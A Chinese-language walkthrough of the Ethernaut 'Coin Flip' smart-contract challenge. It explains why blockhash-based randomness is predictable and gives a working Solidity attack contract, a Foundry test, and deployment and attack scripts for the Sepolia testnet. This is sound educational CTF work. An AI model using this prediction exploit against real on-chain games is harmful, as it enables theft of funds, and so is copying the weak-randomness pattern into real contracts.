# Ethernaut Level 3 - Coin Flip

昨天的创建流程就不再赘述了，今天直接开始第三关 coin flip。
为什么不按照关卡顺序一关一关的来？因为这样学比较有意思。

## 关卡目标

这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。
**目标：猜对十次正反面**

## 直接看合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

看到里面定义了三个变量：
1.  `uint256 public consecutiveWins;` 连续赢的数量
2.  `uint256 lastHash;` 上一个计算正反面的hash值
3.  `uint256 FACTOR = 57896044......;` 这个是因子，计算硬币是正面还是反面的

好的我们来看 `flip` 函数。
首先第一行是 `uint256 blockValue = uint256(blockhash(block.number - 1));`
这个是使用区块的高度，减一，然后取hash值来代表这个区块的 value。

```solidity
        if (lastHash == blockValue) {
            revert();
        }
```
这个就有意思了，为了防止你在同一个块里面连续翻十次硬币，他直接设置了 last hash 如果和这次的块的值是一样的话，直接报错返回。

```solidity
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
```
如果不一样的话，记录下这个块的值到 `lashHash`，然后用 `value` 除以 `FACTOR` 也就是上面的那个大数字，取整数，小于就是 0，大于就是 1，最后看看是不是大于 1。
因为 hash 值的不可预测性，这个非常难预测到是 `blockValue` 的值大还是 `FACTOR` 的值大。

```solidity
        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
```
这个是看看和猜的是不是一致，如果一致就记录下来连续获胜次数 +1，如果不一致，那么直接清 0。

## 破解思路

我们现在分析一下这个应该怎么做。
首先我第一直觉想到的就是直接翻 10 次看运气。
我们知道每次猜中的几率是 1/2。
计算公式为：
(1/2)^10 也就是 1 / 1024，大概是 0.0977%。
如果平均每天尝试一组，也就是每天翻 10 次，平均需要 2.8 年才能成功一次。
看运气是不太行了。

我们分析一下，刚刚说到的在一个块里面同时猜 10 次，也不行，因为同一个 hash 他就会 revert 导致交易失败。
这时候我想到一个办法，因为我们能在合约中获取这个块的信息，然后 `FACTOR` 也给我们了。
**那我们岂不是能在自己的合约中也算出来这个是正面还是反面？**
那如果这样的话，岂不是永远不输了。
思路应该没问题，现在就开干。

## 编写破解合约

我们需要写一个合约来破解这个合约，我就叫他 `coinFlipHack`。
首先我们需要导入 `coinFlip` 这个合约来充当接口，比 interface 定义更好用。
接着我们需要写这个合约的内容了。
我们定义一个 `FACTOR`，和原本合约的 `FACTOR` 应该保持一致。
然后写一个 `guess` 函数来复制原本合约的流程来猜测正反面，之后传入到我们需要的合约里面进去就可以了。
我把参数设置为了 `CoinFlip` 合约的地址，为了可以复用这个合约。

接下来看看代码吧：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract coinFlipHack {

    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; 

    uint public consecutiveWins = 0;

    function guess(address coinFlipAddress) public {
        CoinFlip coinf = CoinFlip(coinFlipAddress);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool result = coinFlip == 1 ? true : false;
        coinf.flip(result);
        consecutiveWins = coinf.consecutiveWins();
    }
}
```

非常简单的一个合约。

## 编写测试

好，现在要我们需要开始写测试来保证他能运行的不出问题。

首先我们需要定义两个东西：
1.  `CoinFlip` 本身，因为我们的 `CoinFlipHack` 要和他交互。
2.  `coinFlipHack`。

再者我们需要设置一个地址，这个地址是攻击者的地址。
然后写 `setUp` 函数。
今天不使用 fork 了，为什么？
因此，Foundry 在 Fork 模式下，对于不存在的未来区块，`blockhash` 会返回 0，到时候会返回 0。
连续两次返回 0 ，就会触发合约中不允许两次 hash 一样的情况，导致 revert。
我们在本地测试即可。
实例化两个合约，然后给攻击者一些钱。

之后写一个 `testGuess` 函数，注意在写 test 函数的时候一定要使用 `test` 开头，不然运行测试的时候编译器会默认没有测试函数。
使用 `vm.roll(block.number + 1);` 来增加模拟的区块数量，不加的话会一直卡在一个数。
我们写一个循环，在其中使用 `hack.guess` 把 `coinFlip` 的地址传进去。
最后检查一下是不是获胜了十次，结束。

OK，逻辑明确，我们来写这个脚本吧：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/coinFlipHack.sol";
import "../src/CoinFlip.sol";

contract coinFlipTest is Test {

    coinFlipHack hack;

    CoinFlip cf;

    address att = makeAddr("attacker");

    address cfAddress;

    function setUp() public {

        cf = new CoinFlip();
        cfAddress = address(cf);
        hack = new coinFlipHack();

        vm.deal(att, 10 ether);
    }


    function testGuess() public {

        vm.startPrank(att);

        for(uint i=0; i<10; i++){
            vm.roll(block.number + 1);
            hack.guess(cfAddress);
            console.log("Consecutive Wins: ", hack.consecutiveWins());
            console.log("Block Number: ", block.number);
        }

        require(hack.consecutiveWins() == 10, "Attack failed");

        vm.stopPrank();
    }

}
```

如果你按照我的命名已经路径的话，可以直接运行下面的命令：
`forge test --match-path test/coinflip.t.sol -vvvv`
不然需要改一下测试的文件名。
出现 `Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.50ms (1.18ms CPU time)` 说明测试通过了。

## 编写攻击脚本

我们现在来编写 script 脚本让这个攻击生效。
我们首先要部署攻击合约到 sepolia 上面。

脚本如下：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/coinFlipHack.sol";

contract CoinFlipH is Script {

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        coinFlipHack attack = new coinFlipHack();
        
        console.log("Attack Contract Deployed at:", address(attack));

        vm.stopBroadcast();

    }
}
```

就是非常简单的部署，这个不用多讲，会打印一个合约地址出来，记好这个地址，等会写入攻击的合约脚本。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/coinFlipHack.sol";

contract CoinFlipH is Script {

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        // 替换为 ethernaut 网页上合约的地址
        address CoinFlipAddress = 0x...;

        // 替换为刚刚部署的攻击合约的地址
        address coinFlipHackAddr = 0x...;

        coinFlipHack hack = coinFlipHack(coinFlipHackAddr);

        vm.startBroadcast(privateKey);

        hack.guess(CoinFlipAddress);
        
        console.log("Attack successful", hack.consecutiveWins());
        
        vm.stopBroadcast();
    }
}
```

这个也没什么好讲的，就是直接攻击。
我们先用 `forge script script/coinFlip.s.sol --rpc-url $SEPOLIA_RPC_URL` 来本地测试一下。
我设置的是运行一次猜一次，所以你应该能得到：
`Attack successful 1`

接下来运行十次：
`forge script script/coinFlip.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast`
就可以搞定。
回到网页提交即可。
